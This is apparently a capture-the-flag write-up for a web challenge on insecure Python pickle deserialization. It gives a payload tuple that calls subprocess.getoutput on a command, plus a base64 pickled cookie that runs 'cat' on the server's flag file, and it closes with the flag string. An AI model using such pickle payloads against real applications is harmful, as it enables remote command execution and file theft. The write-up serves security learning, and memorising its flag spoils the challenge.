* Category
  * Unsecure Deserialization
  * Pickle
* Solution
  1. Generate pickle payload
  2. Use "subprocess.getoutput" to return the output to the website
* Payload
  1. PAYLOAD = ```(__import__('subprocess').getoutput, (command,))```
  2. cookie = ```gASVUAAAAAAAAAB9lCiMA2FnZZRLAYwEbmFtZZSMCnN1YnByb2Nlc3OUjAlnZXRvdXRwdXSUk5SMGmNhdCAvZmxhZ181ZmIyYWNlYmYxZDBjNTU4lIWUUpR1Lg==```
* ```FLAG{p1ckle_r1ck}```